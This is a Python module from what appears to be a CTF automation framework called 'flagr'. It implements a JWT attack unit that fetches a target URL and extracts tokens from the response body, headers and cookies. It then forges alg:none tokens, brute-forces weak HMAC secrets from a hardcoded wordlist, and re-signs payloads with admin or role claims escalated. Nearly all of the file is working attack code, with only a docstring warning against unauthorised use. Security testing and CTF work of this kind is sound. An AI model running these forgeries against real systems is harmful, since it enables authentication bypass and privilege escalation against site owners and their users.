"""
JWT Manipulation/Forging

This unit will detect JWT tokens in web responses and attempt common
JWT attacks: algorithm "none" bypass (re-encoding with an empty signature)
and brute-forcing weak HMAC secrets from a common wordlist.

This unit inherits from :class:`flagr.units.web.WebUnit` as that contains
lots of predefined variables that can be used throughout multiple web units.

.. warning::

    This unit automatically attempts to perform malicious actions on the
    target. **DO NOT** use this in any circumstances where you do not have the
    authority to operate!

"""

import base64
import hashlib
import hmac
import json
import re

import requests

from flagr.unit import NotApplicable
from flagr.units.web import WebUnit


COMMON_SECRETS = [
    "secret",
    "password",
    "key",
    "admin",
    "test",
    "1234",
    "flag",
    "jwt_secret",
    "changeme",
    "default",
]
"""
A list of common weak HMAC secrets to attempt when brute-forcing JWT tokens.
"""

JWT_PATTERN = re.compile(
    r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
)
"""
Regex pattern to detect JWT tokens in HTTP responses.
"""


def b64url_encode(data):
    """Base64url encode bytes, stripping padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def b64url_decode(data):
    """Base64url decode a string, adding necessary padding."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    padding = 4 - len(data) % 4
    if padding != 4:
        data += b"=" * padding
    return base64.urlsafe_b64decode(data)


def hs256_sign(payload_bytes, secret):
    """Sign payload bytes with HMAC-SHA256 and return the base64url signature."""
    signature = hmac.new(
        secret.encode("utf-8"), payload_bytes, hashlib.sha256
    ).digest()
    return b64url_encode(signature)


class Unit(WebUnit):

    GROUPS = ["web", "jwt", "jwt_forge"]
    """
    These are "tags" for a unit. Considering it is a Web unit, "web"
    is included, as well as the name of the unit, "jwt_forge".
    """

    RECURSE_SELF = False
    """
    This unit should not recurse into itself.
    """

    PRIORITY = 25
    """
    Priority works with 0 being the highest priority, and 100 being the
    lowest priority. 50 is the default priority. This unit has a higher
    priority.
    """

    def __init__(self, *args, **kwargs):
        """
        The constructor is included to first fetch the target URL and
        look for JWT tokens in the response. If no JWT tokens are found,
        this unit will abort.
        """

        super(Unit, self).__init__(*args, **kwargs)

        url = self.target.upstream.decode("utf-8", errors="replace")

        try:
            r = requests.get(url, timeout=10)
        except requests.exceptions.ConnectionError:
            raise NotApplicable("cannot reach url")
        except requests.exceptions.Timeout:
            raise NotApplicable("request timed out")

        self.response = r

        # Search for JWT tokens in the response text and headers
        self.tokens = set()

        # Check response body
        for token in JWT_PATTERN.findall(r.text):
            self.tokens.add(token)

        # Check response headers
        for header_name, header_value in r.headers.items():
            for token in JWT_PATTERN.findall(header_value):
                self.tokens.add(token)

        # Check cookies
        for cookie_name, cookie_value in r.cookies.items():
            for token in JWT_PATTERN.findall(cookie_value):
                self.tokens.add(token)

        if not self.tokens:
            raise NotApplicable("no JWT tokens found in response")

    def enumerate(self):
        """
        Yield each JWT token found in the response.

        :return: A generator, yielding JWT token strings.
        """

        for token in self.tokens:
            yield token

    def evaluate(self, case):
        """
        Evaluate the target. For each JWT token, attempt algorithm "none"
        bypass and brute-force weak HMAC secrets.

        :param case: A JWT token string returned by ``enumerate``.

        :return: None. This function should not return any data.
        """

        token = case

        try:
            parts = token.split(".")
            if len(parts) != 3:
                return

            header_b64, payload_b64, signature_b64 = parts

            # Decode the header and payload
            header = json.loads(b64url_decode(header_b64))
            payload = json.loads(b64url_decode(payload_b64))

            self.manager.register_data(
                self, "JWT payload: {}".format(json.dumps(payload))
            )

            # --- Attack 1: Algorithm "none" bypass ---
            none_header = {"alg": "none", "typ": "JWT"}
            none_header_b64 = b64url_encode(
                json.dumps(none_header, separators=(",", ":")).encode("utf-8")
            ).decode("utf-8")
            none_payload_b64 = b64url_encode(
                json.dumps(payload, separators=(",", ":")).encode("utf-8")
            ).decode("utf-8")
            forged_none = "{}.{}.".format(none_header_b64, none_payload_b64)

            self.manager.register_data(
                self, "JWT alg:none forged: {}".format(forged_none)
            )

            # --- Attack 2: Brute-force weak HMAC secrets ---
            for secret in COMMON_SECRETS:
                signing_input = "{}.{}".format(header_b64, payload_b64).encode(
                    "utf-8"
                )
                test_signature = hs256_sign(signing_input, secret)

                if test_signature.decode("utf-8") == signature_b64:
                    self.manager.register_data(
                        self,
                        "JWT secret found: '{}' for token: {}".format(
                            secret, token[:50]
                        ),
                    )

                    # Re-sign with the discovered secret using modified payloads
                    # Try setting admin/role claims
                    modified_payload = dict(payload)
                    for key in ["admin", "is_admin", "role"]:
                        if key in modified_payload:
                            if key == "role":
                                modified_payload[key] = "admin"
                            else:
                                modified_payload[key] = True

                    hs256_header = {"alg": "HS256", "typ": "JWT"}
                    new_header_b64 = b64url_encode(
                        json.dumps(
                            hs256_header, separators=(",", ":")
                        ).encode("utf-8")
                    ).decode("utf-8")
                    new_payload_b64 = b64url_encode(
                        json.dumps(
                            modified_payload, separators=(",", ":")
                        ).encode("utf-8")
                    ).decode("utf-8")
                    new_signing_input = "{}.{}".format(
                        new_header_b64, new_payload_b64
                    ).encode("utf-8")
                    new_signature = hs256_sign(new_signing_input, secret)
                    forged_token = "{}.{}.{}".format(
                        new_header_b64,
                        new_payload_b64,
                        new_signature.decode("utf-8"),
                    )

                    self.manager.register_data(
                        self,
                        "JWT forged with secret '{}': {}".format(
                            secret, forged_token
                        ),
                    )
                    break

        except Exception:
            pass
